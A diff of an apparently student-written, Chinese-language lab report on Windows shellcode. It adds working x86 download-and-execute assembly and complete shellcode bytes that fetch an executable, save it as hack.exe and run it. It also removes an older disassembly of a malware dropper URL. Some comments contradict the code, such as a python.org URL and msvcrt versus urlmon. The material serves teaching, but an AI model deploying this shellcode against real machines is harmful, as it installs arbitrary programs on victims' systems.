@@ -154,6 +154,8 @@
 
 ## 课后实验
 
+### shellcode学习
+
 + 详细阅读 www.exploit-db.com 中的shellcode。建议找不同功能的，不同平台的 3-4个shellcode解读。（选择了其中一个详解）
 
   + 首先我们把演示程序`~/Openctf 2016-tyro_shellcode1/tyro_shellcode1`复制到32位的docker环境中并开启调试器进行调试分析。需要注意的是，由于程序带了一个很简单的反调试，在调试过程中可能会弹出如下窗口：
@@ -185,169 +187,261 @@
     
   + 当然，shell-storm上还有可以执行其他功能如关机，进程炸弹，读取/etc/passwd等的shellcode.
     
-    
-    
-  
-+ 修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA
 
-  + 所有shellcode都难以保证自己的代码被加载到哪个内存地址。shellcode要运转，特别是要读取自身代码里的数据（如病毒URL地址，要调用的函数名等常量和变量），就必须要自我定位，即获取自身在内存中的虚拟地址。一般来说，只要在执行shellcode过程中，能获取到程序当前的入口点EIP值，就能以此定位自己的代码。但是EIP值是不能直接用mov等方法获取的。为此，shellcode编写者利用了一个典型的办法，你在下面的shellcode中将会看到。
 
-  + shellcode必须在所在进程的空间里，调用系统API函数，来完成远程下载文件并运行的目的
 
-  + 只要API所在的dll被进程所加载，就可以通过由kernel32.dll导出的GetProcAddress来得到函数地址，进而Call之。但是，GetProcAddress本身也是一个函数，我们首先要得到它的地址啊！看起来好像进入死循环了。
-    既然如此，shellcode作者就必须模拟程序加载dll的方式，为自己的shellcode代码创建一个类似的“输入表”。要得到 kernel32.dll中的GetProcAddress函数的地址，也就要读取kernel32.dll的输出表。那么，问题变成了如何定位 kernel32.dll的输出表。
+### 文件下载执行
 
-  + 问题转变成了一个PE文件结构读取的问题。只要得到kernel32.dll在进程虚拟空间中的基址（DOS文件头，即MZ的位置），就可以在03CH偏 移处读到PE文件头（"PE"字样地址）相对这个DOS文件头的偏移，并计算出PE文件头地址。PE文件头结构中的78H处，就是输出表的地址了。通过检 索输出表，就可以得到GetProcAddress函数的地址的偏移量，进一步变为在虚拟空间中的入口点地址。
++ 修改示例代码的[shellcode](https://www.exploit-db.com/exploits/48355)，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA
 
-  + 讲到dll的基址，一个结构呼之欲出了——PEB！fs:[0x30]！
+  + 找到kernel32.dll的基址
 
-  + 其他的，看代码注释吧。不知道PEB的（我也是前两天碰巧刚知道），不知道PE文件结构的（我一直看着它看得头昏脑胀）
-
-  + 将shellcode内容作为main函数里的局部变量，之后嵌入两行汇编，将其地址lea入eax后jmp eax进入了shellcode，所以下面的地址是在堆栈里。代码从解密后真正执行开始：
-
-    ```bash
-    0012FE2F E9 D5 00 00 00       jmp         0012FF09                            ;EIP入栈
-    0012FE34 5A                   pop         edx                                 ;得到原EIP(0012FF0E)
-    0012FE35 64 A1 30 00 00 00    mov         eax,fs:[00000030]                   ;PEB头部地址
-    0012FE3B 8B 40 0C             mov         eax,dword ptr [eax+0Ch]             ;PLDR_DATA
-    0012FE3E 8B 70 1C             mov         esi,dword ptr [eax+1Ch]             ;InInitializationOrderModuleList
-    0012FE41 AD                   lods        dword ptr [esi]                     ;Flink,kernel32.dll的PLDR_MODULE
-    0012FE42 8B 40 08             mov         eax,dword ptr [eax+8]               ;kernel32.dll的基址
-    0012FE45 8B D8                mov         ebx,eax                             ;记住ebx=kernel32.dll的基址（MZ头）
-    0012FE47 8B 73 3C             mov         esi,dword ptr [ebx+3Ch]             ;kernel32.dll的PE头相对MZ的偏移
-    0012FE4A 8B 74 1E 78          mov         esi,dword ptr [esi+ebx+78h]         ;输出表地址
-    0012FE4E 03 F3                add         esi,ebx                             ;转化成VA，记住esi=输出表VA
-    0012FE50 8B 7E 20             mov         edi,dword ptr [esi+20h]             ;AddressOfNames
-    0012FE53 03 FB                add         edi,ebx                             ;记住edi=AddressOfNames数组地址
-    0012FE55 8B 4E 14             mov         ecx,dword ptr [esi+14h]             ;NumberOfFunctions
-    0012FE58 33 ED                xor         ebp,ebp
-    0012FE5A 56                   push        esi
-    0012FE5B 57                   push        edi
-    0012FE5C 51                   push        ecx
-    0012FE5D 8B 3F                mov         edi,dword ptr [edi]                 ;首个Name的VA
-    0012FE5F 03 FB                add         edi,ebx                             ;0012FF0E,ASCII "GetProcAddress"
-    0012FE61 8B F2                mov         esi,edx
-    0012FE63 6A 0E                push        0Eh
-    0012FE65 59                   pop         ecx
-    0012FE66 F3 A6                repe cmps   byte ptr [esi],byte ptr [edi]       ;比较
-    0012FE68 74 08                je          0012FE72
-    0012FE6A 59                   pop         ecx
-    0012FE6B 5F                   pop         edi
-    0012FE6C 83 C7 04             add         edi,4
-    0012FE6F 45                   inc         ebp
-    0012FE70 E2 E9                loop        0012FE5B                            ;循环直到找到GetProcAddress
-    0012FE72 59                   pop         ecx
-    0012FE73 5F                   pop         edi
-    0012FE74 5E                   pop         esi
-    0012FE75 8B CD                mov         ecx,ebp
-    0012FE77 8B 46 24             mov         eax,dword ptr [esi+24h]             ;AddressOfNameOrdinals
-    0012FE7A 03 C3                add         eax,ebx
-    0012FE7C D1 E1                shl         ecx,1
-    0012FE7E 03 C1                add         eax,ecx
-    0012FE80 33 C9                xor         ecx,ecx
-    0012FE82 66 8B 08             mov         cx,word ptr [eax]
-    0012FE85 8B 46 1C             mov         eax,dword ptr [esi+1Ch]             ;AddressOfFunctions
-    0012FE88 03 C3                add         eax,ebx
-    0012FE8A C1 E1 02             shl         ecx,2
-    0012FE8D 03 C1                add         eax,ecx                             ;根据之前找到的GetProcAddress的序数
-    0012FE8F 8B 00                mov         eax,dword ptr [eax]                 ;找到GetProcAddress
-    0012FE91 03 C3                add         eax,ebx
-    0012FE93 8B FA                mov         edi,edx
-    0012FE95 8B F7                mov         esi,edi
-    0012FE97 83 C6 0E             add         esi,0Eh                             ;esi值指向GetProcAddress字串末尾
-    0012FE9A 8B D0                mov         edx,eax
-    0012FE9C 6A 04                push        4
-    0012FE9E 59                   pop         ecx                                 ;ecx＝4，计数器，一共要loop四次
-    0012FE9F E8 50 00 00 00       call        0012FEF4                            ;循环，得到了kernel32.dll中四个函数的地址，并将其保存在0012FF0E开始的10H个字节中（覆盖了原来的字符串）
-    0012FEA4 83 C6 0D             add         esi,0Dh                             ;这次esi指向ASCII "urlmon"
-    0012FEA7 52                   push        edx                                 ;edx=GetProcAddress地址，保护
-    0012FEA8 56                   push        esi                                 ;ASCII "urlmon"
-    0012FEA9 FF 57 FC             call        dword ptr [edi-4]                   ;刚刚获得的LoadLibraryA地址
-    0012FEAC 5A                   pop         edx                                 ;edx=GetProcAddress地址
-    0012FEAD 8B D8                mov         ebx,eax                             ;urlmon基址（handler）
-    0012FEAF 6A 01                push        1
-    0012FEB1 59                   pop         ecx                                 ;同样是计数
-    0012FEB2 E8 3D 00 00 00       call        0012FEF4                            ;取URLDownloadToFileA地址
-    0012FEB7 83 C6 13             add         esi,13h                             ;esi指向URL地址
-    0012FEBA 56                   push        esi
-    0012FEBB 46                   inc         esi
-    0012FEBC 80 3E 80             cmp         byte ptr [esi],80h                  ;循环找后面的一个80H
-    0012FEBF 75 FA                jne         0012FEBB
-    0012FEC1 80 36 80             xor         byte ptr [esi],80h                  ;将其变成00H
-    0012FEC4 5E                   pop         esi                                 ;pop回来，又变成指向URL地址了
-    0012FEC5 83 EC 20             sub         esp,20h                             ;留一个20H的缓冲区
-    0012FEC8 8B DC                mov         ebx,esp
-    0012FECA 6A 20                push        20h
-    0012FECC 53                   push        ebx                                 ;缓冲区地址
-    0012FECD FF 57 EC             call        dword ptr [edi-14h]                 ;GetSystemDirectoryA
-    0012FED0 C7 04 03 5C 61 2E 65 mov         dword ptr [ebx+eax],652E615Ch       ;eax为长度，在系统路径后加/a.exe
-    0012FED7 C7 44 03 04 78 65 00 mov         dword ptr [ebx+eax+4],6578h         ;
-    0012FEDF 33 C0                xor         eax,eax                             
-    0012FEE1 50                   push        eax                                 ;0
-    0012FEE2 50                   push        eax                                 ;0
-    0012FEE3 53                   push        ebx                                 ;lpfilename
-    0012FEE4 56                   push        esi                                 ;URL地址
-    0012FEE5 50                   push        eax                                 ;0
-    0012FEE6 FF 57 FC             call        dword ptr [edi-4]                   ;URLDownloadToFileA!!
-    0012FEE9 8B DC                mov         ebx,esp                             ;ebx指向本地filename
-    0012FEEB 50                   push        eax
-    0012FEEC 53                   push        ebx
-    0012FEED FF 57 F0             call        dword ptr [edi-10h]                 ;Winexec!
-    0012FEF0 50                   push        eax                                 ;exitcode
-    0012FEF1 FF 57 F4             call        dword ptr [edi-0Ch]                 ;ExitThread，完结
-    ……………………………………………………………………………………………………………………………………………………
-    下面是紧接着的一段，相当于子程序，获得所需函数的地址，函数名字符串从0012FF0E开始。每次取到地址后，同样会依次覆盖0012FF0E开始的空间。
-    0012FEF4 33 C0                xor         eax,eax                             ;循环，使esi指向下个字符地址
-    0012FEF6 AC                   lods        byte ptr [esi]
-    0012FEF7 85 C0                test        eax,eax
-    0012FEF9 75 F9                jne         0012FEF4
-    0012FEFB 51                   push        ecx
-    0012FEFC 52                   push        edx
-    0012FEFD 56                   push        esi                                 ;下个字符串地址
-    0012FEFE 53                   push        ebx                                 ;dll的基址
-    0012FEFF FF D2                call        edx                                 ;GetProcAddress
-    0012FF01 5A                   pop         edx
-    0012FF02 59                   pop         ecx
-    0012FF03 AB                   stos        dword ptr [edi]                     ;保存地址（会覆盖掉原来的字符串）
-    0012FF04 E2 EE                loop        0012FEF4                            ;ecx是计数的
-    0012FF06 33 C0                xor         eax,eax
-    0012FF08 C3                   ret                                             ;获得所需函数地址，返回
-    ………………………………………………………………………………………………………………………………………………………
-    0012FF09 E8 26 FF FF FF       call        0012FE34
+    ```asm
+    ; Find kernel32.dll base address
+     xor ebx, ebx
+     mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
+     mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
+     mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
+     mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
+     mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
+     mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
+     mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll
     ```
 
-  + 从在内存中存储的顺序上，这是“代码”的最后一行，这个欺骗性的call是程序为了定位自身代码的入口点而使用的典型办法。其实同样是跳回原代码的下一句 执行，但是由于系统执行call时会先把EIP入栈，所以只要在下一句代码里pop，就可以得到被压入堆栈的EIP值，也就可以定位代码自身的位置了。这 里得到的值恰好指向这行代码紧接的“数据区”的开始。
+    ![](./image/kernel.png)
 
-  + 紧接着这里是“数据区”。可以看到这里保存着需要的多个函数名（包括urlmon的dll名），以及“万恶的病毒URL”。对照shellcode代码，你可以发现函数地址是怎么一个一个被找到的。
-    值得一提的有两点：
-    1.找到函数地址后，会把地址一个个依次写在此区的开始，也就是从0012FF0E开始的14H个字节内容将被五个函数地址所代替。
-    2.在所有代码执行之前的解密函数代码执行过程中（我这里省掉了，是xor 66H），从0012FE2F到0012FF6A的内容被xor解密。但是最后一个病毒URL地址，其本身没有加密，也就没有被解密。这跟之前的一次xor FEH不一样
+  + kernel32.dll导出表的地址
 
-    ```bash
-    0012FF0E 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00                         ;ASCII "GetProcAddress"
-    0012FF1D 47 65 74 53 79 73 74 65 6D 44 69 72 65 63 74 6F 72 79 41 00          ;ASCII "GetSystemDirectoryA"       
-    0012FF31 57 69 6E 45 78 65 63 00                                              ;ASCII "WinExec"
-    0012FF39 45 78 69 74 54 68 72 65 61 64 00                                     ;ASCII "ExitThread"
-    0012FF44 4C 6F 61 64 4C 69 62 72 61 72 79 41 00                               ;ASCII "LoadLibraryA"
-    0012FF51 75 72 6C 6D 6F 6E 00                                                 ;ASCII "urlmon"
-    0012FF58 55 52 4C 44 6F 77 6E 6C 6F 61 64 54 6F 46 69 6C 65 41 00             ;ASCII "URLDownloadToFileA"
-    0012FF6B 68 74 74 70 3A 2F 2F 39 39 2E 76 63 2F 73 2E 65 78 65                ;ASCII "http://99.vc/s.exe"
-    0012FF7D 80 00 00             add         byte ptr [eax],0                    ;最后80被改为00
+    ```asm
+    ; Find the address of the Export Table within kernel32.dll
+     mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader
+     add ebx, eax            ; EBX = &NewEXEHeader
+     mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable
+     add ebx, eax            ; EBX = &ExportTable
+     ; Find the address of the Name Pointer Table within kernel32.dll
+     mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable
+     add edi, eax            ; EDI = &NamePointerTable
+     mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame
+    
+    ; Find the address of the Ordinal Table
+     mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable
+     add ecx, eax            ; ECX = &OrdinalTable
+     mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame
+    
+    ; Find the address of the Address Table
+     mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable
+     add edx, eax            ; EDX = &AddressTable
+     mov [ebp-0x10], edx     ; save &AddressTable to stack-frame
+    
+    ; Find Number of Functions within the Export Table of kernel32.dll
+     mov edx, [ebx+0x14]     ; EDX = Number of Functions
+     mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame
     ```
 
-  + 不过，对于一个改节表和入口点的感染型病毒而言，在被感染的文件中，那段在程序初始化后，就被抢先执行的病毒代码，由于其执行的特殊时机（在程序刚初始化 跳到入口点时），它可以轻松地从堆栈中找到一个位于kernel32.dll空间内的地址，然后用它来找kernel32.dll的基址。
+  + 找到函数的入口点[参考](https://www.exploit-db.com/exploits/48355)
 
-  + 经过以上分析，该代码的整体逻辑是： 
-  
-    1. 利用一个call来使得系统将EIP入栈，并马上pop出来，从而解决了自身代码定位问题，而且由于shellcode编排得巧妙，得到的地址正是指向“数据区”的开头。 
-    2. 利用fs:[0x30]这个地址，得到PEB头部的地址。然后读取PEB中的PLDR_DATA指针，再找LDR_DATA结构中的 InInitializationOrderModuleList的Flink，从而得到指向kernel32.dll的LDR_MODULE结构的地 址。通过读取LDR_MODULE结构中的BaseAddress，从而得到了kernel32.dll在进程空间中的基址。由于PEB属于 Undocument的内容，以上名字可能不同的人命名有所不同，但是意义是一样的。 
+    ```asm
+    jmp short functions
+    
+    findFunctionAddr:
+    ; Initialize the Counter to prevent infinite loop
+     xor eax, eax            ; EAX = Counter = 0
+     mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
+    ; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
+    searchLoop:
+     mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
+     mov esi, [ebp+0x18]     ; ESI = Address of String for the Symbol we are searching for 
+     xor ecx, ecx            ; ECX = 0x00000000
+     cld                     ; clear direction flag - Process strings from left to right
+     mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
+     add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
+     add cx, 0xF             ; ECX = len("GetProcAddress,0x00") = 15 = 14 char + 1 Null
+     repe cmpsb              ; compare first 8 bytes of [&NameString] to "GetProcAddress,0x00"
+     jz found                ; If string at [&NameString] == "GetProcAddress,0x00", then end loop
+     inc eax                 ; else Counter ++
+     cmp eax, edx            ; Does EAX == Number of Functions?
+     jb searchLoop           ;   If EAX != Number of Functions, then restart the loop
+    
+    found:
+    ; Find the address of WinExec by using the last value of the Counter
+     mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
+     mov edx, [ebp-0x10]     ; EDX = &AddressTable
+     mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber      = [&OrdinalTable + (Counter*2)]
+     mov eax, [edx + eax*4]  ; EAX = RVA GetProcAddress = [&AddressTable + ordinalNumber]
+     add eax, [ebp-0x4]      ; EAX = &GetProcAddress    = RVA GetProcAddress + &kernel32.dll
+     ret
+    
+    functions:
+    # Push string "GetProcAddress",0x00 onto the stack
+     xor eax, eax            ; clear eax register
+     mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
+     push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"      
+     push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
+     push 0x41636f72         ; Acor : 41636f72
+     push 0x50746547         ; PteG : 50746547
+     mov [ebp-0x18], esp      ; save PTR to string at bottom of stack (ebp)
+     call findFunctionAddr   ; After Return EAX will = &GetProcAddress
+    # EAX = &GetProcAddress
+     mov [ebp-0x1C], eax      ; save &GetProcAddress
+    
+    ; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
+     xor edx, edx            ; EDX = 0x00000000
+     push edx                ; null terminator for LoadLibraryA string
+     push 0x41797261         ; Ayra : 41797261 // "LoadLibraryA",0x00
+     push 0x7262694c         ; rbiL : 7262694c
+     push 0x64616f4c         ; daoL : 64616f4c
+     push esp                ; $hModule    -- push the address of the start of the string onto the stack
+     push dword [ebp-0x4]    ; $lpProcName -- push base address of kernel32.dll to the stack
+     mov eax, [ebp-0x1C]     ; Move the address of GetProcAddress into the EAX register
+     call eax                ; Call the GetProcAddress Function.
+     mov [ebp-0x20], eax     ; save Address of LoadLibraryA 
+    
+    
+    ```
+
+  + 通过刚刚得到的LoadLibraryA函数入口，加载urlmon.dll
+
+    ```asm
+    ; Call LoadLibraryA(PTR "urlmon")
+    ;   push "msvcrt",0x00 to the stack and save pointer
+     xor eax, eax            ; clear eax
+     mov ax, 0x7472          ; tr : 7472
+     push eax
+     push 0x6376736D         ; cvsm : 6376736D
+     push esp                ; push the pointer to the string
+     mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
+     call ebx                ; call the LoadLibraryA Function to load urlmon.dll
+     mov [ebp-0x24], eax     ; save Address of urlmon.dll
+    ```
+
+  + 通过`urlmon.dll`获得`URLDownloadToFileA`的入口地址（套路一致）
+
+    ```asm
+    ; Call GetProcAddress(urlmon.dll, "URLDownloadToFileA")
+    xor edx, edx
+    mov dx, 0x4165          ; Ae
+    push edx
+    push 0x6C69466F         ; liFo
+    push 0x5464616F         ; Tdao
+    push 0x6C6E776F         ; lnwo
+    push 0x444c5255         ; DLRU
+    push esp    		; push pointer to string to stack for 'URLDownloadToFileA'
+    push dword [ebp-0x24]   ; push base address of urlmon.dll to stack
+    mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
+    call eax                ; GetProcAddress
+    ;   EAX = WSAStartup Address
+    mov [ebp-0x28], eax     ; save Address of urlmon.URLDownloadToFileA
+    ```
+
+  + 使用该函数进行[下载文件](https://www.exploit-db.com/shellcodes/13533)
+
+    ```asm
+    ;URLDownloadToFileA(NULL, URL, save as, 0, NULL)
+    download:
+    pop eax
+    xor ecx, ecx
+    push ecx
+    ; URL: https://www.python.org/ftp/python/3.8.3/python-3.8.3.exe
+    push 0x6578652E         ; exe.
+    push 0x74646573         ; tdes
+    push 0x6F6F672F         ; oog/
+    push 0x33312E36         ; 31.6
+    push 0x352E3836         ; 5.86
+    push 0x312E3239         ; 1.29
+    push 0x312F2F3A         ; 1//:
+    push 0x70747468         ; ptth
+    push esp
+    pop ecx                 ; save the URL string
+    xor ebx, ebx
+    push ebx
+    ; save as hack.exe
+    push 0x6578652E         ; exe.
+    push 0x6B636168         ; kcah
+    push esp
+    pop ebx                 ; save the downloaded filename string
+    xor edx, edx
+    push edx
+    push edx
+    push ebx
+    push ecx
+    push edx
+    mov eax, [ebp-0x28]     ; PTR to URLDownloadToFileA to EAX
+    call eax
+    pop ecx
+    add esp, 44
+    xor edx, edx
+    cmp eax, edx
+    push ecx
+    jnz download            ; if it fails to download , retry contineusly
+    pop edx
+    ```
+
+  + 找到`WinExec`函数的入口地址，并调用该函数运行下载的文件，最后退出程序
+
+    ```asm
+     Create string 'WinExec\x00' on the stack and save its address to the stack-frame
+    mov edx, 0x63657878     \
+    shr edx, 8              ; Shifts edx register to the right 8 bits
+    push edx                ; "\x00,cex"
+    push 0x456E6957         ; EniW : 456E6957
+    mov [ebp+0x18], esp     ; save address of string 'WinExec\x00' to the stack-frame
+    call findFunctionAddr   ; After Return EAX will = &WinExec
+    
+    
+    xor ecx, ecx          ; clear eax register
+    push ecx              ; string terminator 0x00 for "hack.exe" string
+    push 0x6578652e       ; exe. : 6578652e
+    push 0x6B636168       ; kcah : 6B636168
+    mov ebx, esp          ; save pointer to "hack.exe" string in eax
+    inc ecx               ; uCmdShow SW_SHOWNORMAL = 0x00000001
+    push ecx              ; uCmdShow  - push 0x1 to stack # 2nd argument
+    push ebx              ; lpcmdLine - push string address stack # 1st argument
+    call eax              ; Call the WinExec Function
+    
+    ; Create string 'ExitProcess\x00' on the stack and save its address to the stack-frame
+     xor ecx, ecx          ; clear eax register
+     mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
+     shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
+     push ecx                ;  sse : 00737365
+     push 0x636F7250         ; corP : 636F7250
+     push 0x74697845         ; tixE : 74697845
+     mov [ebp+0x18], esp     ; save address of string 'ExitProcess\x00' to stack-frame
+     call findFunctionAddr   ; After Return EAX will = &ExitProcess
+    
+    ; Call ExitProcess(ExitCode)
+     xor edx, edx
+     push edx                ; ExitCode = 0
+     call eax                ; ExitProcess(ExitCode)
+    ```
+
+  + 将该反汇编文件通过`nasm`工具进行编译并用`objdump`工具变为可执行代码
+
+    ```bash
+    nasm -f win32 test.asm -o test.o
+    for i in $(objdump -D test.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+    ```
+
+    ![](./image/test.png)
+
+  + 代码如下
+
+    ```shell
+    \x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\x31\xc0\x66\xb8\x73\x73\x50\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x89\x65\x18\xe8\xb0\xff\xff\xff\x89\x45\xe4\x31\xd2\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\xff\x75\xfc\x8b\x45\xe4\xff\xd0\x89\x45\xe0\x31\xc0\x66\xb8\x6f\x6e\x50\x68\x75\x72\x6c\x6d\x54\x8b\x5d\xe0\xff\xd3\x89\x45\xdc\x31\xd2\x66\xba\x65\x41\x52\x68\x6f\x46\x69\x6c\x68\x6f\x61\x64\x54\x68\x6f\x77\x6e\x6c\x68\x55\x52\x4c\x44\x54\xff\x75\xdc\x8b\x45\xe4\xff\xd0\x89\x45\xd8\x58\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x73\x65\x64\x74\x68\x2f\x67\x6f\x6f\x68\x36\x2e\x31\x33\x68\x36\x38\x2e\x35\x68\x39\x32\x2e\x31\x68\x3a\x2f\x2f\x31\x68\x68\x74\x74\x70\x54\x59\x31\xdb\x53\x68\x2e\x65\x78\x65\x68\x68\x61\x63\x6b\x54\x5b\x31\xd2\x52\x52\x53\x51\x52\x8b\x45\xd8\xff\xd0\x59\x83\xc4\x2c\x31\xd2\x39\xd0\x51\x75\xac\x5a\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xe8\xfe\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x68\x61\x63\x6b\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\xb7\xfe\xff\xff\x31\xd2\x52\xff\xd0
+    ```
+
+  + 代码执行成功以后，出现如下结果，由于下载的文件并不是能立马执行的exe，无法正常执行，这可以理解
+
+    ![](./image/su.png)
+
+  + 该代码的**整体逻辑**是： 
+
+    2. 利用fs:[0x30]这个地址，得到PEB头部的地址。然后读取PEB中的PLDR_DATA指针，再找LDR_DATA结构中的 InInitializationOrderModuleList的Flink，从而得到指向kernel32.dll的LDR_MODULE结构的地址。通过读取LDR_MODULE结构中的BaseAddress，从而得到了kernel32.dll在进程空间中的基址。
     3. 通过读取kernel32.dll在进程空间中的映像的PE文件结构，找到其输出表，通过循环比对，在AddressOfNames数组中找到指向GetProcAddress这个函数名的指针位置，定位其索引号位置。 
-    4. 通过索引查AddressOfFunctions数组，找到GetProcAddress的函数入口偏移量，加上kernel32.dll的基址，终于得到了GetProcAddress函数的确切入口。 
-    5. 通过调用GetProcAddress函数，配合kernel32.dll的基址这个句柄，找到GetSystemDirectoryA、 Winexec、ExitThread、LoadLibraryA这四个由kernel32.dll导出的函数的入口点，并将之依次保存到“数据区”开头 以备调用。 
+    4. 通过索引查AddressOfFunctions数组，找到GetProcAddress的函数入口偏移量，加上kernel32.dll的基址，得到了GetProcAddress函数的确切入口。 
+    5. 通过调用GetProcAddress函数，配合kernel32.dll的基址这个句柄，找到Winexec、ExitProcess、LoadLibraryA这几个由kernel32.dll导出的函数的入口点，并将之依次保存到“数据区”开头 以备调用。 
     6. 通过刚刚得到的LoadLibraryA函数入口，加载urlmon.dll，用GetProcAddress得到重要的函数URLDownloadToFileA的入口点，同样保存备用。 
-    7. 通过调用GetSystemDirectoryA，得到系统文件夹路径（即XP里默认为C:/WINDOWS/system32，注意得到的路径最后没有"/"），在路径后面加入/a.exe，作为下载保存的本地地址。 
-    8. 调用URLDownloadToFileA，将由挂马者指定的URL地址对应的病毒文件，下载到本机，并调用Winexec运行。 
-    9. 完成以上所有任务，调用ExitThread，退出自身线程。
+    8. 调用URLDownloadToFileA，下载文件到本机，并调用Winexec运行。 
+    9. 完成以上所有任务，调用ExitProcess，退出进程。
 
 ## 实验参考资料
 
@@ -357,3 +451,6 @@
 + [pev学习](https://www.cnblogs.com/binlmmhc/p/6501545.html)
 + [PEB structure](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
 + [Process_Environment_Block](https://en.wikipedia.org/wiki/Process_Environment_Block)
++ [Windows/x64 - URLDownloadToFileA(http://localhost/trojan.exe) + Execute Shellcode (218+ bytes)](https://www.exploit-db.com/shellcodes/13533)
++ [Windows/x86 - URLDownloadToFileA(http://192.168.86.130/sample.exe) + SetFileAttributesA(pyld.exe) + WinExec() + ExitProcess() Shellcode (394 bytes)](https://www.exploit-db.com/shellcodes/40094)
++ [indows/x86 - MSVCRT System + Dynamic Null-free + Add RDP Admin + Disable Firewall + Enable RDP Shellcode (644 Bytes)](https://www.exploit-db.com/exploits/48355)
